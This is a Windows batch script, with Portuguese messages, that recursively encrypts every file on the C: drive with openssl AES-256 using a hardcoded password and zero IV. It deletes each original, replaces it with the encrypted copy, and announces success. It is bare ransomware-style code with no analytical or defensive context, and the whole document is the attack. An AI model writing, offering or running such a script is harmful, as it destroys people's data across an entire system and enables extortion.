@echo off
set "senha=3060tkj(GJK%%($*¨(@#LKTG"

set "tamanho_bloco=65536"
set "chave=%TEMP%\chave.txt"
set "iv=%TEMP%\iv.txt"

echo %senha%> %chave%
certutil -encodehex -f %chave% %chave%.hex >nul
set /p hexchave=<%chave%.hex

echo %hexchave:~0,64% > %chave%

set "tempfile=%TEMP%\tempfile"
for /r "C:\" %%f in (*.*) do (
    if not "%%~nxf"=="criptografado.bat" (
        echo Criptografando "%%~nxf"...
        openssl enc -aes-256-cbc -e -in "%%f" -out "%tempfile%" -K %hexchave:~0,64% -iv 0 -nosalt
        del "%%f"
        ren "%tempfile%" "%%~nxf"
    )
)
del %chave% %chave%.hex
echo Todos os arquivos foram criptografados com sucesso!
pause
